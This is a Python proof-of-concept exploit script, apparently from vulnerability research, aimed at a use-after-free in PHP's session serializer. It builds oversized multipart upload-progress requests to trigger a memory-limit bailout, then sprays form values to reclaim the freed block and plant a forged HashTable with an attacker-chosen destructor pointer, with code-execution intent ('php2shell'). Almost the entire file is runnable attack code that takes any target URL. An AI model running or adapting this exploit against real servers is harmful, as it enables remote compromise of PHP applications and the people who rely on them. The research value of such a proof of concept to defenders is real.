#!/usr/bin/env python3
"""php2shell Bug S - BG(serialize) context orphan (CVE-2026-109618/109619 class B).

ARM: same huge-filename upload-progress body, tuned so the pre-RINIT ENCODE
     (PS_SERIALIZER_ENCODE_FUNC(php), session.c:1079-1108) passes memory_limit
     inside php_var_serialize. The encode path has no zend_try around
     PHP_VAR_SERIALIZE_INIT/DESTROY, so the bailout orphans BG(serialize)
     (level=1, data -> freed 64-byte php_serialize_data:
     HashTable{...pDestructor=ZVAL_PTR_DTOR} + uint32 n at +0x38).
FIRE: t[] form parts with <=39-byte values reclaim the 64-byte bin, then the
     file part's update() reuses the block as the live serialize context.
     Receipt without a crash: php_add_var_hash does data->n += 1 at +0x38
     (string val[32]) - the reflected $_POST['t'][i] bytes mutate after the
     reclaim. With a ref/object in the session tree the fake HashTable is
     walked: arData is the reclaiming string's len field; pDestructor
     (val[24]) is attacker-planted and fires from zend_hash_destroy when the
     level count returns to 1 - the leak-gated zend_call_function route.

Lab:  python poc_serialize.py --url http://127.0.0.1:18082/index.php --lab
"""
from __future__ import annotations

import argparse
import socket
import ssl
import struct
import time
from urllib.parse import urlparse

# zend_string alloc = 24 + len + 1 <= 64  ->  len <= 39
SPRAY_LEN = 39
# php_serialize_data overlay inside the string val (val = block+24):
#   +24 nNumUsed/+28 nNumOfElements/+32 nTableSize/+36 nInternalPointer
#   +40 nNextFreeElement/+48 pDestructor/+56 n (uint32)
MARK_NFREE = 0x4343434343434343
MARK_PDTOR = 0x4444444444444444
ARM_NAMES = 20
ARM_NAMELEN = 262144


def forge_t(pdtor: int) -> bytes:
    rec = bytearray(SPRAY_LEN)
    def put(off_in_block: int, raw: bytes):
        i = off_in_block - 24
        if 0 <= i and i + len(raw) <= len(rec):
            rec[i:i + len(raw)] = raw
    put(24, struct.pack("<IIII", 1, 1, 8, 0))   # counters: nNumUsed=1 ...
    put(40, struct.pack("<Q", MARK_NFREE))      # nNextFreeElement
    put(48, struct.pack("<Q", pdtor))           # pDestructor
    # +56 n lands past len 39; on 64-byte-bin strings the alloc pads to 64,
    # n sits in the pad (n++ safe there; counters above are the receipt).
    return bytes(rec)


def mp_part(b: bytes, name: bytes, value: bytes, filename: bytes | None = None) -> bytes:
    disp = b'Content-Disposition: form-data; name="' + name + b'"'
    if filename is not None:
        disp += b'; filename="' + filename + b'"'
    return b"--" + b + b"\r\n" + disp + b"\r\n\r\n" + value + b"\r\n"


def arm_body(sid: str, b: bytes) -> bytes:
    out = bytearray()
    out += mp_part(b, b"PHPSESSID", sid.encode())
    out += mp_part(b, b"PHP_SESSION_UPLOAD_PROGRESS", b"x")
    for i in range(ARM_NAMES):
        fn = (f"f{i}-".encode() + b"N" * ARM_NAMELEN)[:ARM_NAMELEN]
        out += mp_part(b, f"upload{i}".encode(), b"Z", filename=fn)
    out += b"--" + b + b"--\r\n"
    return bytes(out)


def fire_body(sid: str, b: bytes, n: int, tval: bytes) -> bytes:
    out = bytearray()
    out += mp_part(b, b"PHPSESSID", sid.encode())
    out += mp_part(b, b"PHP_SESSION_UPLOAD_PROGRESS", b"x")
    for _ in range(n):
        out += mp_part(b, b"t[]", tval)
    out += mp_part(b, b"f", b"A" * 6144, filename=b"a")
    out += mp_part(b, b"g", b"B" * 6144, filename=b"b")
    out += b"--" + b + b"--\r\n"
    return bytes(out)


def send(url: str, body: bytes, boundary: bytes, sid: str, stall: float, chunk: int):
    u = urlparse(url)
    host, port = u.hostname, u.port or (443 if u.scheme == "https" else 80)
    head = (
        f"POST {u.path or '/'} HTTP/1.1\r\nHost: {host}\r\n"
        f"Cookie: PHPSESSID={sid}\r\n"
        f"Content-Type: multipart/form-data; boundary={boundary.decode()}\r\n"
        f"Content-Length: {len(body)}\r\nConnection: close\r\n\r\n"
    ).encode()
    t0 = time.time()
    if u.scheme == "https":
        ss = ssl.create_default_context().wrap_socket(
            socket.create_connection((host, port), timeout=90), server_hostname=host)
    else:
        ss = socket.create_connection((host, port), timeout=90)
    try:
        ss.sendall(head + body[:chunk or len(body)])
        if chunk and stall:
            time.sleep(stall)
            ss.sendall(body[chunk:])
        ss.settimeout(60)
        data = bytearray()
        while True:
            try:
                d = ss.recv(65536)
            except (socket.timeout, ConnectionResetError, ssl.SSLError) as e:
                data.extend(f"\n<RECV {type(e).__name__}>".encode())
                break
            if not d:
                break
            data += d
    finally:
        try:
            ss.close()
        except OSError:
            pass
    dt = time.time() - t0
    raw = bytes(data)
    first = raw.split(b"\r\n", 1)[0]
    status = int(raw.split(b" ", 2)[1]) if b"HTTP/" in first else None
    hdr_end = raw.find(b"\r\n\r\n")
    return status, (raw[hdr_end + 4:] if hdr_end > 0 else raw), dt


def main() -> None:
    p = argparse.ArgumentParser()
    p.add_argument("url")
    p.add_argument("--sid", default="s0123456789abcdefghijklmnopqrstuv")
    p.add_argument("--stall", type=float, default=1.35)
    p.add_argument("--spray", type=int, default=120)
    p.add_argument("--chunk", type=int, default=0)
    p.add_argument("--pdtor", default="0x4444444444444444")
    p.add_argument("--lab", action="store_true")
    a = p.parse_args()

    tval = forge_t(int(a.pdtor, 0))
    b = b"SctxPoc2026"
    arm = arm_body(a.sid, b)
    fire = fire_body(a.sid, b, a.spray, tval)

    print(f"[arm ] body={len(arm)}")
    st, body, dt = send(a.url, arm, b, a.sid, 0.0 if a.lab else a.stall,
                        0 if a.lab else min(a.chunk or 8192, len(arm)))
    print(f"[arm ] status={st} dt={dt:.2f}s fatal={b'exhausted' in body}")
    print(f"[arm ] body[:160]={body[:160]!r}")

    print(f"[fire] spray={a.spray}x{SPRAY_LEN}B body={len(fire)}")
    st, body, dt = send(a.url, fire, b, a.sid, 0.0 if a.lab else a.stall,
                        0 if a.lab else min(a.chunk or 8192, len(fire)))
    print(f"[fire] status={st} dt={dt:.2f}s")
    hexb = body.hex().encode()
    for needle, label in ((struct.pack("<Q", MARK_NFREE).hex().encode(), "nfreq-marker"),
                          (struct.pack("<Q", int(a.pdtor, 0)).hex().encode(), "pdtor-marker"),
                          (b"LABOK", "reflection"), (b"PID=", "reflection")):
        if needle in body or needle in hexb:
            print(f"[fire] HIT {label}")
    print(f"[fire] body[:400]={body[:400]!r}")


if __name__ == "__main__":
    main()
